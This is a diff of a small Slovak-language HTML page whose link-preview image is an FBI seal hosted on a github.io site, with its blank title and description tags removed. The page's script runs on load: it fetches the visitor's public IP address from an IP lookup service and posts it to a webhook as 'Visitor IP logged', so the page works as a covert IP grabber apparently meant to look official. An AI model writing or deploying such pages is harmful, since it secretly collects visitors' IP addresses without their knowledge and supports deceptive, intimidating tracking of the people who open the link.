@@ -2,18 +2,11 @@
 <html lang="sk">
 <head>
   <meta charset="UTF-8" />
-  <title> </title>  <!-- just a space -->
-
-  <meta property="og:title" content=" " />
-  <meta property="og:description" content=" " />
   <meta property="og:image" content="https://kokotzkanala.github.io/TBO-2.0-Ui/FBI_logo_Seal_of_the_Federal_Bureau_of_Investigation-2264216785.png" />
   <meta property="og:image:type" content="image/png" />
   <meta property="og:image:width" content="1200" />
   <meta property="og:image:height" content="630" />
-
   <meta name="twitter:card" content="summary_large_image" />
-  <meta name="twitter:title" content=" " />
-  <meta name="twitter:description" content=" " />
   <meta name="twitter:image" content="https://kokotzkanala.github.io/TBO-2.0-Ui/FBI_logo_Seal_of_the_Federal_Bureau_of_Investigation-2264216785.png" />
 </head>
 <body>
@@ -23,11 +16,10 @@
     fetch('https://api.ipify.org?format=json')
       .then(res => res.json())
       .then(data => {
-        const ip = data.ip;
         fetch(webhookURL, {
           method: 'POST',
           headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({ content: `Visitor IP logged: ${ip}` })
+          body: JSON.stringify({ content: `Visitor IP logged: ${data.ip}` })
         });
       });
   </script>
